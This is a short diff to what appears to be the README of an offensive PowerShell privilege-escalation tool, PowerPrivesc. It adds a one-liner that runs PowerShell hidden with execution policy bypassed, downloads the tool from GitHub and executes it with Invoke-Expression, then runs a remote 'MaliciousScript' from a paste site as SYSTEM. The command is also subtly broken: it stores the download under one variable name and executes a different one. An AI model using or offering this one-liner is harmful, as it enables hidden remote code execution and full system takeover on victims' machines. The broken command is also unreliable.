@@ -46,5 +46,7 @@ Description
 -----------
 Run the Script as Administrator with window not hidden
 ```
+One-Liner Example
+`powershell.exe powershell.exe -nop -W hidden -ep bypass -NoExit -Command "$accessspowerprivesc = Invoke-WebRequest https://raw.githubusercontent.com/GetRektBoy724/PowerPrivesc/master/Invoke-PowerPrivesc.ps1 -UseBasicParsing;Invoke-Expression $access.Content;Invoke-PowerPrivesc -ScriptLink https://paste.c-net.org/MaliciousScript -ToPrivilege SYSTEM -HideWindow"`
  # To-do List
 
